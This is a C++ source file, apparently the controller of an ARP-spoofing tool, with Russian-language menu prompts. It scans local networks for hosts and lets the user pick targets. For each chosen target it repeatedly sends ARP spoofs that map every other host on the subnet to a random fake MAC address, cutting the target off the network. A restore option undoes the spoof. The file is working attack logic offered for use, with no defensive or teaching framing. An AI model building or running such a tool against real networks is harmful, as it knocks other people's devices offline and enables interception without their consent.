#include "controller.h"
#include "../view/socket_view.h"
#include "../view/thread_view.h"
#include "../view/mac_view.h"
#include "../view/color.h"
#include "../view/string_view.h"

#include <iostream>
#include <string>
#include <algorithm>

Controller::Controller(const int attack_interval_ms) : attack_interval_ms(attack_interval_ms) {}

void Controller::scan_targets() 
{
    std::vector<Host> active_hosts = scanner.scan_networks();
    for (const Host &active_host : active_hosts) 
    {
        hosts.insert(active_host);
    }
}

void Controller::show_targets() 
{
    scan_targets();

    Color::Modifier red(Color::Code::FG_RED);
    Color::Modifier green(Color::Code::FG_GREEN);
    Color::Modifier normal(Color::Code::FG_DEFAULT);

    std::cout << "\n========================= Arp Spoof =========================\n";
    std::cout << "Выберите 1 или несколько целей(пробел для разделения)\n";
    std::cout << "q - Выход\nr-обновить список целей\n";

    size_t counter = 1;
    for (const Host &host : hosts) 
    {
        std::cout << (host.is_cut() ? red : green) << (counter++) << ") " << host.get_ip() << " (" << host.get_mac() << ")\n" << normal;
    }

    std::cout << "\nTargets: ";
}

std::vector<size_t> Controller::get_targets() 
{
    std::vector<size_t> indices;
    std::string input;
    std::getline(std::cin, input);
    std::string trimmed_input = String::trim(input);

    if (trimmed_input == "q") 
    {
        recover_all_hosts();
        Socket::close_sockets();
        Thread::stop_all_threads();
        exit(EXIT_SUCCESS);
    } 
    else if (trimmed_input == "r") 
    {
        return std::vector<size_t>();
    }
    
    std::vector<std::string> tokens = String::split(trimmed_input, " ");

    std::for_each(tokens.begin(), tokens.end(), [&](const string &s) 
    {
        if (!s.empty() && std::all_of(s.begin(), s.end(), [](const char &chr) { return isdigit(chr); })) 
        {
            indices.emplace_back(std::stoul(s));
        }
    });

    std::sort(indices.begin(), indices.end());

    return indices;
}

void Controller::action(size_t index) 
{
    index--;
    if (index >= hosts.size())
    {
        return;
    }

    auto iter = hosts.begin();
    std::advance(iter, index);

    if (iter->is_cut()) 
    {
        recover(*iter);
    } 
    else 
    {
        attack(*iter);
    }
}

void Controller::attack(const Host &target) 
{
    Interface interface = scanner.get_interface_by_ip(target.get_ip());
    for (const Host &host : hosts) 
    {
        if (host.get_ip() == target.get_ip() || !interface.is_same_subnet(host.get_ip())) 
        {
            continue;
        }

        if (arp.find(target) == arp.end())
        {
            arp[target] = ARP(interface);
        }

        if (fake_mac_address.find(host) == fake_mac_address.end()) 
        {
            fake_mac_address[host] = get_fake_mac_address();
        }

        arp[target].spoof(target, host, attack_interval_ms, fake_mac_address[host]);
    }
    target.set_status(Status::CUT);
}

void Controller::recover(const Host &target) 
{
    Interface interface = scanner.get_interface_by_ip(target.get_ip());
    for (const Host &host : hosts) 
    {
        if (host.get_ip() == target.get_ip() || !interface.is_same_subnet(host.get_ip())) 
        {
            continue;
        }
        arp[target].recover(target, host);
    }
    target.set_status(Status::NORMAL);
}

void Controller::recover_all_hosts() 
{
    for (const Host &host : hosts) 
    {
        if (host.is_cut()) 
        {
            recover(host);
        }
    }
}

std::string Controller::get_fake_mac_address() const 
{    return Mac::get_random_mac_address();  }